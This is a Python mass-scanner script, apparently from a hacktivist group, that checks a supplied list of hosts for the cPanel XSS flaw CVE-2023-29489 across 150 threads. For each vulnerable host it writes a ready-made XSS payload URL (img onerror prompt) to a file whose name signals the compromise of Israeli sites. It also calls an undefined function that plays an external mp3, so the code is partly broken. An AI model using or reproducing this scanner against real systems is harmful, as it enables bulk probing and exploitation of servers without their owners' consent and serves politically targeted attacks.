import requests, sys, os, colorama, time, ctypes, datetime, sys, platform
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse
from colorama import Fore, Back, Style
from datetime import date
from time import gmtime, strftime
from colorama import *

today = date.today()
d2 = today.strftime("%B %d, %Y")

if platform.system()=='Linux':
    os.system('clear')
    sys.stdout.write("\x1b]2;S4NG P3NY4L4NG\x07")
else:
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'S4NG P3NY4L4NG | {d2}') 

print(f"""{Style.BRIGHT + Fore.RED}

      
░██████╗░█████╗░███╗░░██╗░██████╗░  ██████╗░███████╗███╗░░██╗██╗░░░██╗░█████╗░██╗░░░░░░█████╗░███╗░░██╗░██████╗░
██╔════╝██╔══██╗████╗░██║██╔════╝░  ██╔══██╗██╔════╝████╗░██║╚██╗░██╔╝██╔══██╗██║░░░░░██╔══██╗████╗░██║██╔════╝░
╚█████╗░███████║██╔██╗██║██║░░██╗░  ██████╔╝█████╗░░██╔██╗██║░╚████╔╝░███████║██║░░░░░███████║██╔██╗██║██║░░██╗░
░╚═══██╗██╔══██║██║╚████║██║░░╚██╗  ██╔═══╝░██╔══╝░░██║╚████║░░╚██╔╝░░██╔══██║██║░░░░░██╔══██║██║╚████║██║░░╚██╗
██████╔╝██║░░██║██║░╚███║╚██████╔╝  ██║░░░░░███████╗██║░╚███║░░░██║░░░██║░░██║███████╗██║░░██║██║░╚███║╚██████╔╝
╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░  ╚═╝░░░░░╚══════╝╚═╝░░╚══╝░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░
                                                                                    
{Fore.WHITE}════════════════════════════════════════════════════════════════════════════════════
{Style.BRIGHT + Fore.YELLOW}  
                CVE-2023-29489 Scanner
                Get Started With Bissmillah And End With Alhamdulillah 
                    USAGE : python bot.py ip.txt                              

{Fore.WHITE}════════════════════════════════════════════════════════════════════════════════════
""")

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
pwd = os.getcwd()
listSite = sys.argv[1]
op = [i.strip() for i in open(listSite, "r").readlines()]

def check(website):
  try:
    r = requests.get("https://"+website+"/cpanelwebcall/", verify=False, timeout=15)
    ff = open("IsraelCpanelPawnedCVE2023-29484.txt", "a+")
    if "HTTP error 400" in r.text:
      print("\033[32m[x][  VULNERABLE  ] > \033[37m[" + website + "] [HIT!]")
      ff.write("https://"+ website +"/cpanelwebcall/%3Cimg%20src=x%20onerror=%22prompt(1)%22%3Eaaaaaaaaaaaa\n")
    else:
      print("\033[31m[!][   NOT VULN   ] > \033[37m["+website+"]")
  except:
    print("\033[31m[!][NO CONNECTION ] > \033[37m["+website+"]")
tod = Pool(150)
tod.map(check, op)
tod.close()
tod.join()
play('https://free.geeex.net/ok.mp3')
print("\n[+] Saved: {}/IsraelCpanelPawnedCVE2023-29484.txt".format(pwd))